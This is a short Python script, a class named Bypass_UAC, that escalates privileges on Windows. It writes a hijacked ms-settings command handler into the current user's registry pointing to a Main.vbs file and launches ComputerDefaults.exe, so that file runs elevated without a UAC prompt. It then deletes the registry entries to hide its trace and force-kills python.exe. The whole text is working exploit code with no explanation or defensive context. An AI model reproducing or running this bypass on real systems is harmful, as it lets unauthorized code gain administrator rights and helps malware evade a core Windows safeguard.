from _winreg import *
import os
class Bypass_UAC():
	def __init__(self):
		self.Main()

	def Main(self):
		REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
		CreateKey(HKEY_CURRENT_USER, REG_PATH)
		registry_key = OpenKey(HKEY_CURRENT_USER, REG_PATH, 0, KEY_WRITE)
		SetValueEx(registry_key, "DelegateExecute", 0, REG_SZ, "")
		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\"
		dirname = "wscript.exe \"" + dirname + "Main.vbs\""
		SetValueEx(registry_key, None, 0, REG_SZ, dirname)
		os.system("ComputerDefaults.exe")
		DeleteValue(registry_key, "")
		DeleteValue(registry_key, "DelegateExecute")
		CloseKey(registry_key)
		os.system("taskkill /IM python.exe /F")
